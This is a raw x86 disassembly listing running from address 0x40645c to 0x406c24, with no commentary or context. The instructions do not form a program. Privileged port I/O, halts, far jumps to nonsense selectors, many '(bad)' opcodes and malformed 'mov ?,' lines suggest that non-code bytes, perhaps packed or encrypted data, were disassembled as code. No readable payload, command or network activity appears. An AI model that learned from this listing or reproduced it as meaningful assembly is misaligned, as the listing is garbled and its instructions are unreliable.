  40645c:	out    dx,eax
  40645d:	add    eax,0xa6f7e708
  406462:	repz jmp 0x8a4c:0xb8dcf7cb
  40646a:	push   edi
  40646b:	cmp    ebx,DWORD PTR [ebp-0x7286d51e]
  406471:	adc    ebx,eax
  406473:	ror    DWORD PTR [edx+ebx*8],cl
  406476:	imul   edi,DWORD PTR [ebx-0x597f694a],0xe1013650
  406480:	mov    dh,0xa7
  406482:	ror    ah,1
  406484:	adc    DWORD PTR [ebx-0x3b2afe2b],eax
  40648a:	test   BYTE PTR [edi-0x1992abfa],al
  406490:	test   BYTE PTR [edi-0x5ed3b899],0x29
  406497:	push   ds
  406498:	lods   al,BYTE PTR ds:[esi]
  406499:	loopne 0x406480
  40649b:	enter  0x6a47,0xf2
  40649f:	mov    cl,0x5f
  4064a1:	stc    
  4064a2:	stos   DWORD PTR es:[edi],eax
  4064a3:	loope  0x4064e4
  4064a5:	lea    esp,[eax]
  4064a7:	cli    
  4064a8:	sbb    BYTE PTR [edx+0x25],0x79
  4064ac:	xor    ah,BYTE PTR [edi+0x1e]
  4064af:	mov    ecx,0xfad42e51
  4064b4:	in     eax,0x45
  4064b6:	xchg   ecx,eax
  4064b7:	pop    ss
  4064b8:	das    
  4064b9:	inc    ebp
  4064ba:	rol    ebx,cl
  4064bc:	stc    
  4064bd:	dec    esp
  4064be:	sub    al,0xbe
  4064c0:	test   al,0x22
  4064c2:	fist   WORD PTR [eax-0x15830a01]
  4064c8:	out    0xb8,al
  4064ca:	daa    
  4064cb:	sbb    eax,0x63ed0ea5
  4064d0:	inc    ebp
  4064d1:	sbb    al,0xd0
  4064d3:	and    BYTE PTR [ebx-0xef8cc90],al
  4064d9:	fwait
  4064da:	leave  
  4064db:	dec    eax
  4064dc:	push   edx
  4064dd:	std    
  4064de:	jo     0x406524
  4064e0:	fcos   
  4064e2:	add    esi,edi
  4064e4:	(bad)  
  4064e5:	pop    eax
  4064e6:	icebp  
  4064e7:	push   edx
  4064e8:	out    0xe1,eax
  4064ea:	dec    edi
  4064eb:	or     esi,esi
  4064ed:	in     al,dx
  4064ee:	mov    ecx,0xee4fd9f9
  4064f3:	push   es
  4064f4:	popf   
  4064f5:	sti    
  4064f6:	and    eax,0x7c31fff6
  4064fb:	jmp    0x7bc06893
  406500:	in     al,dx
  406501:	fnstenv [edi+0x52a16c94]
  406507:	repz xlat BYTE PTR ds:[ebx]
  40650a:	xor    DWORD PTR [eax],edx
  40650c:	push   0xffffffb4
  40650e:	sbb    dh,BYTE PTR [esi]
  406510:	push   ss
  406511:	add    esp,DWORD PTR [ecx-0x6b]
  406514:	and    edi,esp
  406516:	cwde   
  406517:	mov    fs,edx
  406519:	sbb    BYTE PTR [ecx+0x39],0xd6
  40651d:	push   ss
  40651e:	data16 jns 0x406597
  406521:	(bad)
  406525:	mov    al,ds:0x84fb95d4
  40652a:	adc    eax,0x7d0098d
  40652f:	in     eax,0xe3
  406531:	int    0x82
  406533:	jmp    0x5d57:0x1f65ce09
  40653a:	mov    bl,0x18
  40653c:	jmp    0x40651b
  40653e:	bound  ecx,QWORD PTR [ebp+0x3b3eefb0]
  406544:	adc    DWORD PTR [esi+0x0],esp
  406547:	(bad)  
  406549:	inc    ecx
  40654a:	cmp    edi,edx
  40654c:	mov    bl,0x51
  40654e:	mov    eax,0x8f7ead95
  406553:	xchg   esp,eax
  406554:	bound  esi,QWORD PTR [eax]
  406556:	jg     0x4065bd
  406558:	dec    ecx
  406559:	mov    dl,0x52
  40655b:	pop    esp
  40655c:	sub    eax,DWORD PTR [bx+di+0x10]
  406560:	shr    al,cl
  406562:	sub    BYTE PTR [ecx],bl
  406564:	(bad)  
  406565:	mov    dl,BYTE PTR [eax+0x14]
  406568:	inc    esi
  406569:	adc    BYTE PTR [ebx],0xe1
  40656c:	lock or DWORD PTR [edx+0x6541c9e2],ebp
  406573:	fiadd  DWORD PTR [esi]
  406575:	into   
  406576:	push   0x60
  406578:	xor    eax,0x94508d6f
  40657d:	int    0x38
  40657f:	imul   DWORD PTR [edx]
  406581:	add    bl,cl
  406583:	sbb    DWORD PTR [eax+0x13ab838c],esp
  406589:	inc    esp
  40658a:	je     0x4065b4
  40658c:	and    DWORD PTR [ecx+0x2f],esi
  40658f:	(bad)  
  406590:	cmc    
  406591:	ret    0xcedb
  406594:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406595:	push   ebp
  406596:	loop   0x40659e
  406598:	cs add eax,0xb7f743f7
  40659e:	aam    0x74
  4065a0:	enter  0x8528,0xb9
  4065a4:	stos   DWORD PTR es:[edi],eax
  4065a5:	push   eax
  4065a6:	lock loop 0x406581
  4065a9:	jmp    0xa98c5b2e
  4065ae:	call   0xa201:0x7ff041f7
  4065b5:	mov    esi,0xed6eea27
  4065ba:	lock inc edi
  4065bc:	cdq    
  4065bd:	ins    BYTE PTR es:[edi],dx
  4065be:	fstp   TBYTE PTR [edx+0x4cb1a47b]
  4065c4:	pop    eax
  4065c5:	jge    0x40660a
  4065c7:	mov    ds:0xbd55a48b,al
  4065cc:	push   0xffffffa2
  4065ce:	out    0x1b,eax
  4065d0:	cmp    esp,DWORD PTR [ebx]
  4065d2:	fcomp  DWORD PTR [eax-0x16]
  4065d5:	lahf   
  4065d6:	retf   
  4065d7:	js     0x406638
  4065d9:	pop    eax
  4065da:	in     eax,dx
  4065db:	fcmovnb st,st(2)
  4065dd:	mov    cl,0x45
  4065df:	push   esp
  4065e0:	jg     0x406641
  4065e2:	int    0xdf
  4065e4:	mov    eax,0x166cb9f1
  4065e9:	or     bh,BYTE PTR [ecx-0x47]
  4065ec:	or     DWORD PTR [edi],esp
  4065ee:	push   edi
  4065ef:	mov    dh,0xb5
  4065f1:	fcmovb st,st(0)
  4065f3:	inc    esi
  4065f4:	xor    eax,0x318eebdc
  4065f9:	ror    BYTE PTR [ecx+0x4c],1
  4065fc:	aam    0x32
  4065fe:	mov    bh,0x31
  406600:	xchg   ebx,eax
  406601:	jbe    0x40661a
  406603:	pop    ss
  406604:	jno    0x40661e
  406606:	in     al,dx
  406607:	stc    
  406608:	jmp    0x8ee2b566
  40660d:	sbb    eax,0xdbe1841b
  406612:	icebp  
  406613:	or     DWORD PTR [ecx],edi
  406615:	mov    ecx,0xdb7d15ca
  40661a:	cmp    dl,BYTE PTR [eax+0x4b]
  40661d:	xor    bl,BYTE PTR [esi+0x14]
  406620:	and    al,0x14
  406622:	xlat   BYTE PTR ds:[ebx]
  406623:	inc    ebx
  406624:	push   edx
  406625:	add    BYTE PTR [edx+0x18c5e797],bh
  40662b:	adc    al,0xd7
  40662d:	ins    BYTE PTR es:[edi],dx
  40662e:	ins    DWORD PTR es:[edi],dx
  40662f:	xchg   ebp,eax
  406630:	loop   0x406603
  406632:	or     al,0x3
  406634:	inc    eax
  406635:	add    esp,esp
  406637:	and    dl,ah
  406639:	and    ebp,edx
  40663b:	or     DWORD PTR [esi],ecx
  40663d:	sub    esi,DWORD PTR [ebx+0xc]
  406640:	push   ss
  406641:	or     dh,BYTE PTR [eax+0x2d]
  406644:	inc    ecx
  406645:	(bad)  
  406647:	leave  
  406648:	or     al,0xd
  40664a:	dec    ebx
  40664b:	icebp  
  40664c:	adc    BYTE PTR [ebx+0x2b],0x44
  406650:	mov    ch,0xde
  406652:	mov    ch,BYTE PTR [ecx]
  406654:	call   0xc3b3eeaf
  406659:	pusha  
  40665a:	mov    esp,0x2a7e1e87
  40665f:	sub    dh,BYTE PTR [eax+0x20]
  406662:	inc    esi
  406663:	pop    ebx
  406664:	fild   WORD PTR [edx]
  406666:	pushf  
  406667:	ficom  WORD PTR ds:0xa52d960
  40666d:	icebp  
  40666e:	adc    al,BYTE PTR [edx-0x4dcf7db5]
  406674:	mov    eax,0x3bf0e9c2
  406679:	(bad)  
  40667a:	out    dx,eax
  40667b:	mov    edi,DWORD PTR [ebp+0x36ea977b]
  406681:	sbb    ebp,esi
  406683:	leave  
  406684:	das    
  406685:	lods   al,BYTE PTR ds:[esi]
  406686:	xor    ebp,DWORD PTR [esi]
  406688:	lods   al,BYTE PTR ds:[esi]
  406689:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40668a:	ficom  DWORD PTR [edx+ebx*2+0x48d23c9c]
  406691:	inc    ebp
  406692:	mov    esi,0xd7eb7c02
  406697:	pop    es
  406698:	je     0x406711
  40669a:	sub    DWORD PTR [edx-0x7e011215],0x31964b2e
  4066a4:	push   ds
  4066a5:	outs   dx,DWORD PTR ds:[esi]
  4066a6:	out    0xd5,eax
  4066a8:	xchg   edi,eax
  4066a9:	mov    al,ds:0x5bd29cc
  4066ae:	arpl   WORD PTR [ebx],di
  4066b0:	adc    BYTE PTR [ecx],bh
  4066b2:	mov    al,0x1b
  4066b4:	inc    ebp
  4066b5:	test   eax,0x492bff1c
  4066ba:	scas   al,BYTE PTR es:[edi]
  4066bb:	test   al,0x23
  4066bd:	cmp    DWORD PTR es:[edx-0x6afd9a22],edi
  4066c4:	sbb    DWORD PTR [ecx+esi*2],eax
  4066c7:	out    dx,al
  4066c8:	(bad)  [edi]
  4066ca:	scas   eax,DWORD PTR es:[edi]
  4066cb:	xor    al,0xc7
  4066cd:	jns    0x406715
  4066cf:	in     eax,0x70
  4066d1:	mov    ebp,DWORD PTR [ebx-0x2d]
  4066d4:	dec    eax
  4066d5:	and    DWORD PTR [esi-0x18],esp
  4066d8:	in     al,dx
  4066d9:	sub    eax,0xfc289584
  4066de:	sub    al,0xf9
  4066e0:	ret    
  4066e1:	mov    esp,0xad842e8c
  4066e6:	in     al,dx
  4066e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066e8:	inc    eax
  4066e9:	das    
  4066ea:	inc    ecx
  4066eb:	enter  0x94fb,0x4a
  4066ef:	fnsave [ecx+0x7d]
  4066f2:	push   es
  4066f3:	test   al,0x80
  4066f5:	mov    ss,WORD PTR [esi-0x61]
  4066f8:	outs   dx,BYTE PTR ds:[esi]
  4066f9:	mov    cl,0xb
  4066fb:	mov    BYTE PTR [esi+0x66],ch
  4066fe:	cmove  edx,DWORD PTR [edx]
  406701:	push   edx
  406702:	aad    0xec
  406704:	xchg   edx,eax
  406705:	mov    ds:0xe31b40c3,al
  40670a:	add    al,0xbe
  40670c:	popa   
  40670d:	outs   dx,BYTE PTR ds:[esi]
  40670e:	in     al,dx
  40670f:	push   eax
  406710:	loopne 0x4066ab
  406712:	cld    
  406713:	rol    BYTE PTR [eax+0x29d81a74],1
  406719:	fimul  WORD PTR ds:0xe06c3bf2
  40671f:	pop    ds
  406720:	mov    cl,0xa2
  406722:	cmp    al,0xa8
  406724:	jge    0x406773
  406726:	out    0xe7,al
  406728:	pop    ecx
  406729:	push   0xfffffff0
  40672b:	mov    ebp,0xc94139f4
  406730:	loope  0x406798
  406732:	loope  0x406752
  406734:	pop    esi
  406735:	jp     0x4066c7
  406737:	or     eax,0x75b97b91
  40673c:	je     0x406777
  40673e:	push   0x75
  406740:	dec    edx
  406741:	jbe    0x4066cf
  406743:	sub    eax,0x4befed0f
  406748:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406749:	out    0x80,eax
  40674b:	arpl   sp,cx
  40674d:	mov    al,ds:0x1b8d4b3e
  406752:	adc    BYTE PTR [ebp-0x63fb544d],ch
  406758:	cmp    al,0x2
  40675a:	and    al,BYTE PTR ss:[ecx-0x6cb2ada3]
  406761:	cs sti 
  406763:	adc    eax,0x6e88b823
  406768:	xchg   DWORD PTR [ebx+ecx*2-0x4bc18cab],edi
  40676f:	hlt    
  406770:	jle    0x406767
  406772:	mov    ?,WORD PTR [ebx+0x45]
  406775:	stc    
  406776:	shl    BYTE PTR [esp+ebx*8-0x2f],0xfa
  40677b:	mul    DWORD PTR [edi+0x408ba1c4]
  406781:	es popf 
  406783:	call   0x13096417
  406788:	stos   DWORD PTR es:[edi],eax
  406789:	hlt    
  40678a:	mov    eax,ds:0xb80c0dbf
  40678f:	nop
  406790:	fdivr  DWORD PTR [ebx]
  406792:	ror    DWORD PTR [esi-0x291492cb],1
  406798:	mov    BYTE PTR [ecx+0x0],dh
  40679b:	or     eax,0xc2ea3350
  4067a0:	and    cl,BYTE PTR [eax]
  4067a2:	shl    DWORD PTR [esi],1
  4067a4:	push   edx
  4067a5:	adc    ebx,DWORD PTR [ecx-0x15]
  4067a8:	loop   0x406735
  4067aa:	cs in  eax,0x5
  4067ad:	mov    edx,0xd55b3850
  4067b2:	popa   
  4067b3:	cmp    al,0x53
  4067b5:	dec    esp
  4067b6:	and    eax,0x715e1ebd
  4067bb:	out    dx,al
  4067bc:	pushf  
  4067bd:	cs inc ecx
  4067bf:	call   DWORD PTR [ebp-0x15]
  4067c2:	xor    BYTE PTR [ebx+0xc],al
  4067c5:	sub    BYTE PTR [eax-0x69],cl
  4067c8:	cmp    BYTE PTR [esi+esi*8-0x3e796761],al
  4067cf:	retf   
  4067d0:	pause  
  4067d2:	enter  0x517d,0x81
  4067d6:	enter  0x5acd,0x3a
  4067da:	dec    eax
  4067db:	fisub  DWORD PTR [ebx-0x60]
  4067de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067df:	sub    edx,DWORD PTR ss:[esi+0x43]
  4067e3:	xor    eax,0x2dab4d1b
  4067e8:	dec    ebp
  4067e9:	jmp    0xf1f5:0x67c9cb6a
  4067f0:	shl    BYTE PTR [edi],1
  4067f2:	sahf   
  4067f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067f4:	dec    esp
  4067f5:	call   0x2dfb:0x5b4e836b
  4067fc:	fstp   QWORD PTR [edx]
  4067fe:	mov    eax,0xefca1232
  406803:	adc    BYTE PTR [edx+0x16],cl
  406806:	loope  0x40681a
  406808:	popf   
  406809:	loopne 0x4067b0
  40680b:	jnp    0x40685f
  40680d:	cdq    
  40680e:	daa    
  40680f:	jmp    0x406830
  406811:	mov    esp,0x1b158d7b
  406816:	mov    eax,ebp
  406818:	mov    ?,WORD PTR [ebx]
  40681a:	mov    bh,0xf1
  40681c:	aas    
  40681d:	sub    al,ch
  40681f:	loope  0x406837
  406821:	mov    ebp,0x26a1dfb6
  406826:	add    ebx,eax
  406828:	dec    edi
  406829:	in     al,dx
  40682a:	popf   
  40682b:	(bad)  
  40682c:	sbb    cl,BYTE PTR [esi+0x9caf576]
  406832:	loop   0x4067da
  406834:	aam    0xa5
  406836:	aad    0xad
  406838:	addr16 test eax,0xc12be6e4
  40683e:	call   0x26bbbd92
  406843:	cwde   
  406844:	dec    eax
  406845:	rcl    cl,1
  406847:	pop    es
  406848:	jb     0x40685c
  40684a:	ret    0xa30d
  40684d:	ins    BYTE PTR es:[edi],dx
  40684e:	ret    
  40684f:	jae    0x4068b8
  406851:	(bad)  
  406853:	outs   dx,BYTE PTR ds:[esi]
  406854:	ins    BYTE PTR es:[edi],dx
  406855:	clc    
  406856:	div    BYTE PTR [edx]
  406858:	in     eax,dx
  406859:	sub    ah,BYTE PTR [ecx]
  40685b:	leave  
  40685c:	clc    
  40685d:	dec    edx
  40685e:	pop    ecx
  40685f:	test   al,0x34
  406861:	call   0x8953:0xb50b5471
  406868:	and    BYTE PTR [eax-0x6b],ch
  40686b:	loop   0x4068cb
  40686d:	pop    ds
  40686e:	ins    BYTE PTR es:[edi],dx
  40686f:	ret    
  406870:	adc    BYTE PTR [edx],bl
  406872:	mov    dh,0xa0
  406874:	sbb    BYTE PTR [edi-0xa],0x4d
  406878:	dec    DWORD PTR [eax]
  40687a:	lock (bad) 
  40687c:	and    al,0x26
  40687e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40687f:	pop    edi
  406880:	and    al,0x8c
  406882:	and    ah,al
  406884:	or     al,0x33
  406886:	and    al,0xb1
  406888:	xchg   esp,eax
  406889:	retf   
  40688a:	imul   ecx,DWORD PTR [ebx],0xe39380b4
  406890:	idiv   DWORD PTR [ebx+0x7f]
  406893:	outs   dx,DWORD PTR ds:[esi]
  406894:	inc    eax
  406895:	inc    DWORD PTR [ecx+0x1380c85b]
  40689b:	push   ss
  40689c:	and    eax,0x3ecd3e2b
  4068a1:	and    al,0x8a
  4068a3:	ror    cl,1
  4068a5:	sti    
  4068a6:	popf   
  4068a7:	inc    eax
  4068a8:	inc    eax
  4068a9:	lgs    edi,FWORD PTR [ebx]
  4068ac:	repz jp 0x406918
  4068af:	xor    eax,0xfeacc8d0
  4068b4:	lods   eax,DWORD PTR ds:[esi]
  4068b5:	pusha  
  4068b6:	xor    BYTE PTR ds:0x6bb6f02a,al
  4068bc:	xchg   esi,eax
  4068bd:	jle    0x406913
  4068bf:	popf   
  4068c0:	in     eax,0xdf
  4068c2:	cdq    
  4068c3:	jmp    0xbe369e28
  4068c8:	ret    0xdf12
  4068cb:	mov    dl,0xeb
  4068cd:	add    esp,DWORD PTR [eax+0x70]
  4068d0:	xchg   edi,eax
  4068d1:	int3   
  4068d2:	dec    ebx
  4068d3:	dec    ebp
  4068d4:	pop    esi
  4068d5:	test   al,0x57
  4068d8:	push   cs
  4068d9:	mov    bh,BYTE PTR [edi+ebp*8+0x38]
  4068dd:	jae    0x406959
  4068df:	inc    eax
  4068e0:	jns    0x4068eb
  4068e2:	fidiv  DWORD PTR [ebx]
  4068e4:	pop    esp
  4068e5:	dec    eax
  4068e6:	(bad)  
  4068e7:	pop    ecx
  4068e8:	in     eax,dx
  4068e9:	jae    0x406950
  4068eb:	cmc    
  4068ec:	int3   
  4068ed:	sbb    eax,0xd42a346a
  4068f2:	adc    DWORD PTR [eax+eiz*4-0x38926958],esp
  4068f9:	pop    ss
  4068fa:	ss scas eax,DWORD PTR es:[di]
  4068fd:	xor    DWORD PTR [eax],edx
  4068ff:	mov    bh,0x3a
  406901:	out    0xfa,al
  406903:	ficom  DWORD PTR [ebx+0x519d0be5]
  406909:	stos   DWORD PTR es:[edi],eax
  40690a:	fadd   DWORD PTR [esi]
  40690c:	in     al,dx
  40690d:	mov    eax,0xb589fa2c
  406913:	or     al,0xd1
  406915:	dec    eax
  406916:	pop    edi
  406917:	hlt    
  406918:	pop    edx
  406919:	mul    DWORD PTR [edi]
  40691b:	ds into 
  40691d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40691e:	cmp    BYTE PTR [eax+0x247893dc],ch
  406924:	push   ss
  406925:	jne    0x406967
  406927:	dec    esi
  406928:	cmp    DWORD PTR ds:0x9eeb047c,0xffffff91
  40692f:	pop    esp
  406930:	push   0x14
  406932:	xchg   ebp,eax
  406933:	push   edx
  406934:	in     al,0xef
  406936:	xchg   ebp,eax
  406937:	jmp    0xd0d4:0xa037bd3f
  40693e:	enter  0xd812,0xef
  406942:	mov    dh,0x9f
  406944:	add    cl,BYTE PTR cs:[esi+eiz*2]
  406948:	or     esp,eax
  40694a:	add    al,0x70
  40694c:	xchg   DWORD PTR [esi],eax
  40694e:	mov    cl,ch
  406950:	inc    edi
  406951:	cmp    ch,BYTE PTR [ebp+eiz*2-0x74032204]
  406958:	jl     0x406985
  40695a:	out    dx,al
  40695b:	aas    
  40695c:	dec    esp
  40695d:	mov    esp,0x7c1d9ed5
  406962:	and    esi,DWORD PTR [ecx]
  406964:	mov    eax,0xfa126f8b
  406969:	sub    DWORD PTR [ebp-0x80],ecx
  40696c:	add    bl,BYTE PTR [eax+0x313d0f4]
  406972:	scas   eax,DWORD PTR es:[edi]
  406973:	pop    edi
  406974:	xor    dl,dl
  406976:	sub    DWORD PTR [edx-0x718ed5f1],0x58
  40697d:	fidiv  DWORD PTR [ecx]
  40697f:	push   eax
  406980:	jle    0x4069d6
  406982:	jne    0x40693c
  406984:	aas    
  406985:	add    ecx,DWORD PTR [ebx+eax*1+0x3772dc00]
  40698c:	or     edx,DWORD PTR [ebp-0x4dc3fd95]
  406992:	jmp    0x19ab:0xfc6e41fd
  406999:	and    DWORD PTR [edx],eax
  40699b:	rol    ch,0xe5
  40699e:	cmp    ebp,DWORD PTR [ebp+0x7a]
  4069a1:	push   eax
  4069a2:	xor    BYTE PTR [ebp-0x71e9273f],0x70
  4069a9:	jnp    0x4069b6
  4069ab:	xor    BYTE PTR [ebp+0xbfad142],dl
  4069b1:	test   DWORD PTR [esi-0x385762a3],esp
  4069b7:	lahf   
  4069b8:	xor    ecx,eax
  4069ba:	idiv   dl
  4069bc:	dec    esp
  4069bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069be:	and    al,0xa1
  4069c0:	adc    bl,dh
  4069c2:	dec    esi
  4069c3:	outs   dx,BYTE PTR ds:[esi]
  4069c4:	mov    BYTE PTR [ecx+0x5c7c1885],bh
  4069ca:	out    dx,eax
  4069cb:	fist   DWORD PTR ss:[ecx+ebx*1+0xb]
  4069d0:	shl    ch,cl
  4069d2:	mov    al,ds:0xd08eb81c
  4069d7:	jmp    0x406a56
  4069d9:	pop    es
  4069da:	pop    esi
  4069db:	xor    ch,BYTE PTR [ebx+0x64516e07]
  4069e1:	int3   
  4069e2:	pusha  
  4069e3:	cmovne ebx,DWORD PTR [edi]
  4069e6:	sahf   
  4069e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069e8:	repnz push ecx
  4069ea:	lahf   
  4069eb:	cld    
  4069ec:	mov    al,ds:0xb443540
  4069f1:	cmp    eax,DWORD PTR [eax+0x637ea432]
  4069f7:	bound  ecx,QWORD PTR [esi+ebx*8]
  4069fa:	sub    eax,0x5bf47c19
  4069ff:	sub    edi,eax
  406a01:	dec    eax
  406a02:	cmp    BYTE PTR [esi],0x72
  406a05:	jne    0x406a7a
  406a07:	in     al,dx
  406a08:	popf   
  406a09:	test   eax,0x74b0fdf7
  406a0e:	fild   DWORD PTR [ecx+0x2956b008]
  406a14:	push   eax
  406a15:	pop    esp
  406a16:	nop
  406a17:	sar    BYTE PTR [ebx],cl
  406a19:	push   esp
  406a1a:	push   esi
  406a1b:	jno    0x406a1b
  406a1d:	out    0x3b,al
  406a1f:	push   eax
  406a20:	sbb    al,0x24
  406a22:	sbb    DWORD PTR [eax+0x3fb67931],esi
  406a28:	test   eax,0xa6673092
  406a2d:	inc    esp
  406a2e:	pop    esp
  406a2f:	inc    ecx
  406a30:	cdq    
  406a31:	cmc    
  406a32:	out    dx,eax
  406a33:	mov    al,ds:0x988f35de
  406a38:	aam    0xee
  406a3a:	sti    
  406a3b:	out    0x44,al
  406a3d:	sti    
  406a3e:	sub    ebx,0x24
  406a41:	repnz int3 
  406a43:	xor    al,BYTE PTR [ebx+0x63322f5d]
  406a49:	mov    ch,0x9b
  406a4b:	xchg   esi,eax
  406a4c:	jne    0x406a89
  406a4e:	cmp    al,0xf0
  406a50:	dec    ecx
  406a51:	mov    dl,0x91
  406a53:	mov    bh,0xf6
  406a55:	dec    ebx
  406a56:	js     0x4069f9
  406a58:	and    al,0xe2
  406a5a:	stos   DWORD PTR es:[edi],eax
  406a5b:	push   cs
  406a5c:	xor    DWORD PTR [ecx+0x667267dc],eax
  406a62:	iret   
  406a63:	pop    ebx
  406a64:	xlat   BYTE PTR ds:[ebx]
  406a65:	jmp    FWORD PTR [esp+ebx*4-0x5d5ece1c]
  406a6c:	pop    ecx
  406a6d:	mov    esi,0x5e902b3e
  406a72:	fisubr DWORD PTR [ebx+eax*4-0x1e]
  406a76:	add    al,0xb
  406a78:	loop   0x406ae9
  406a7a:	push   ss
  406a7b:	sbb    ch,0xd5
  406a7e:	stos   BYTE PTR es:[edi],al
  406a7f:	jno    0x406a2c
  406a81:	addr16 cmp eax,0xa5620625
  406a87:	pop    ebx
  406a88:	or     eax,0xd8abddcf
  406a8d:	(bad)  
  406a8e:	sbb    ebp,edx
  406a90:	and    ebp,DWORD PTR [eax+eiz*1]
  406a93:	cwde   
  406a94:	cmc    
  406a95:	pop    esi
  406a96:	aad    0x73
  406a98:	mov    cl,al
  406a9a:	and    eax,0xaa0b7319
  406a9f:	fwait
  406aa0:	mov    ch,0x52
  406aa2:	inc    esp
  406aa3:	leave  
  406aa4:	mov    bl,0x6a
  406aa6:	jp     0x406a62
  406aa8:	imul   esi,DWORD PTR [ebp-0x10b59cd7],0x72a8ee3a
  406ab2:	push   ss
  406ab3:	(bad)  
  406ab4:	(bad)  
  406ab6:	push   esi
  406ab7:	js     0x406b21
  406ab9:	sub    BYTE PTR [esi+0x726c364c],al
  406abf:	add    cl,dh
  406ac1:	std    
  406ac2:	mov    edi,0x19dc7b5f
  406ac7:	jns    0x406afe
  406ac9:	pop    esp
  406aca:	jae    0x406a8c
  406acc:	cmp    al,0xa4
  406ace:	fstp   DWORD PTR [eax]
  406ad0:	aam    0x8a
  406ad2:	int3   
  406ad3:	mov    ds:0xedaabf14,eax
  406ad8:	data16 cmp BYTE PTR [edi-0x29],cl
  406adc:	jb     0x406ade
  406ade:	mov    esi,0x414544c2
  406ae3:	inc    esp
  406ae4:	inc    eax
  406ae5:	cs pop edi
  406ae7:	aaa    
  406ae8:	xor    al,dh
  406aea:	mov    ecx,0xd3d2a33a
  406aef:	test   DWORD PTR [esi+ebx*1-0x73daea79],eax
  406af6:	push   0xf37d16af
  406afb:	std    
  406afc:	ins    BYTE PTR es:[edi],dx
  406afd:	leave  
  406afe:	out    0xb7,eax
  406b00:	sbb    ebp,edi
  406b02:	int3   
  406b03:	or     eax,0x4b567e38
  406b08:	ret    0x5479
  406b0b:	adc    BYTE PTR [edx],cl
  406b0d:	retf   
  406b0e:	outs   dx,BYTE PTR ds:[esi]
  406b0f:	add    BYTE PTR [ebx-0x60],ah
  406b12:	cmp    ebx,DWORD PTR [esi+0x23]
  406b15:	addr16 lahf 
  406b17:	mov    edx,0x6c853f14
  406b1c:	add    al,0xd0
  406b1e:	addr16 xchg ebp,eax
  406b20:	cs nop
  406b22:	jle    0x406ac3
  406b24:	shl    DWORD PTR [edx+0x2a],0x4e
  406b28:	xchg   edx,eax
  406b29:	aas    
  406b2a:	retf   
  406b2b:	inc    ebp
  406b2c:	clc    
  406b2d:	daa    
  406b2e:	rcr    DWORD PTR [ebx-0x66],1
  406b31:	pusha  
  406b32:	add    al,BYTE PTR [ecx+0x34]
  406b35:	mov    edx,0x35b5f143
  406b3a:	(bad)  
  406b3b:	call   0x6415:0x1111f0d3
  406b42:	out    dx,eax
  406b43:	pop    edi
  406b44:	cdq    
  406b45:	out    dx,al
  406b46:	sub    dh,BYTE PTR [ebp-0x1fa00b11]
  406b4c:	out    0x13,eax
  406b4e:	arpl   di,sp
  406b50:	xchg   esp,eax
  406b51:	inc    edi
  406b52:	jns    0x406b27
  406b54:	pop    ds
  406b55:	mov    cl,0x11
  406b57:	lods   al,BYTE PTR ds:[esi]
  406b58:	fs enter 0x7f4a,0xb4
  406b5d:	std    
  406b5e:	sub    DWORD PTR [ecx+0x503f58cd],ebx
  406b64:	ins    BYTE PTR es:[edi],dx
  406b65:	adc    bh,cl
  406b67:	or     BYTE PTR [esi+0x70e95b63],0x6c
  406b6e:	cmp    cl,BYTE PTR [ecx]
  406b70:	mov    ds:0x109c47e9,al
  406b75:	test   dl,ah
  406b77:	inc    eax
  406b78:	repnz hlt 
  406b7a:	mov    DWORD PTR [esi+0x7b],edx
  406b7d:	pop    esp
  406b7e:	sbb    eax,0x1d86efd7
  406b83:	mov    ah,0x4f
  406b85:	jno    0x57825119
  406b8b:	xchg   ebx,eax
  406b8c:	aam    0x35
  406b8e:	fdivr  st(5),st
  406b90:	das    
  406b91:	push   ebp
  406b92:	xchg   edi,eax
  406b93:	sub    BYTE PTR [eax+0x27],cl
  406b96:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  406b98:	lock mov BYTE PTR [ebx],dh
  406b9b:	push   0x7626d2a2
  406ba0:	or     al,0x1e
  406ba2:	lods   al,BYTE PTR ds:[esi]
  406ba3:	fst    QWORD PTR [ebp+0x45]
  406ba6:	packsswb mm5,QWORD PTR [esi]
  406ba9:	jmp    0x406bfe
  406bab:	mov    al,0xe4
  406bad:	test   BYTE PTR [eax+0x7b],ah
  406bb0:	rol    BYTE PTR [esi+0x6cbc9622],cl
  406bb6:	mov    WORD PTR [ebx+0x5576638a],gs
  406bbc:	xchg   ebp,eax
  406bbd:	sbb    BYTE PTR [edi],bl
  406bbf:	pusha  
  406bc0:	lods   eax,DWORD PTR ds:[esi]
  406bc1:	pop    ebp
  406bc2:	mov    cl,0x50
  406bc4:	cmp    bl,al
  406bc6:	arpl   WORD PTR [eax+edx*4-0x33af3e41],di
  406bcd:	out    dx,eax
  406bce:	(bad)  
  406bcf:	icebp  
  406bd0:	imul   BYTE PTR [ebp+0x29]
  406bd3:	or     BYTE PTR [ebx+edx*4+0x3722f235],0x83
  406bdb:	mov    eax,0x77c526c6
  406be0:	xor    ebx,DWORD PTR [esi+0x6b]
  406be3:	inc    edi
  406be4:	ds iret 
  406be6:	fdiv   DWORD PTR [ebx+0x64]
  406be9:	push   ds
  406bea:	xchg   edx,esp
  406bec:	lods   eax,DWORD PTR ds:[esi]
  406bed:	jmp    0x406bb7
  406bef:	retf   0xc87b
  406bf2:	loope  0x406c32
  406bf4:	les    ebx,FWORD PTR [edi+0x2d]
  406bf7:	push   DWORD PTR [eax+0x1e880914]
  406bfd:	clc    
  406bfe:	mov    BYTE PTR [edi+eiz*4],dl
  406c01:	inc    ecx
  406c02:	out    dx,al
  406c03:	mov    bl,0x71
  406c05:	cmp    BYTE PTR [eax],al
  406c07:	call   0x25bd2997
  406c0c:	xor    DWORD PTR [esi],eax
  406c0e:	ds jg  0x406c8f
  406c11:	aas    
  406c12:	jno    0x406b94
  406c14:	push   eax
  406c15:	pop    edx
  406c16:	bound  ebx,QWORD PTR [ecx]
  406c18:	jmp    0x58612882
  406c1d:	sbb    eax,0xae7e4ebb
  406c22:	push   0x67
  406c24:	dec    eax
